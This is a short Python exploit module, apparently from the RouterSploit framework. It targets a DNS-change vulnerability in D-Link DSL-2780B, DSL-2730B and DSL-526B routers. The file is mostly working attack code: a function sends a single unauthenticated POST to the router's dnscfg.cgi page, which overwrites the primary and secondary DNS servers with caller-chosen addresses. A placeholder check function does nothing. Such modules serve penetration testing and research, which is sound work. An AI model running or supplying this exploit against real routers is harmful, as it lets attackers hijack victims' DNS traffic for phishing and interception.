# rsf exploit module
# description: Module exploits D-Link DSL-2780B, DSL-2730B and DSL-526B DNS change vulnerability
import requests

def exploit(target, port, dns1="8.8.8.8", dns2="8.8.4.4"):
    try:
        path = f"/dnscfg.cgi?dnsPrimary={dns1}&dnsSecondary={dns2}&dnsDynamic=0&dnsRefresh=1&dnsIfcsList="
        response = requests.post(f"http://{target}:{port}{path}", timeout=5)
        return response.status_code == 200
    except:
        return False

def check(target, port=80):
    return None  # Cannot verify without changing DNS
